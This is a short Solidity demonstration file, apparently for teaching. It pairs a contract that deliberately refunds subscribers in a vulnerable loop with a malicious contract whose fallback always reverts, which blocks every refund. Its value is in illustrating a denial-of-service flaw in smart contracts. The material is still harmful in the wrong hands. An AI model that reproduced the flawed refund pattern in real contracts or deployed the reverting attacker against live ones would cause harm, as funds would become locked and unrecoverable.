pragma solidity >0.5.0;
// Example DenialOfService Attack

contract VulnerableContract {
    address owner = msg.sender;
    address payable[] public subscribers;
    uint FEE_COST = 1 ether;

    function subscribe() public payable {
        require(msg.value == FEE_COST, "Insufficient msg.value");
        subscribers.push(msg.sender);
    }

    function refundFees() public {
        require(msg.sender == owner, "msg.sender should be owner");
        for(uint i = subscribers.length; i > 0; i--) {
            subscribers[i - 1].transfer(FEE_COST);
            subscribers.pop();
        }
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }

    // Auxiliar function for demo. It wouldn't be present in a vulnerable contract
    function removeLastSubscriber() public {
        subscribers.pop();
    }
}

contract MaliciousContract {
    VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f);

    function subscribe() public payable {
        vulnerableContract.subscribe.value(msg.value)();
    }

    function() external payable {
        require(false);
    }
}
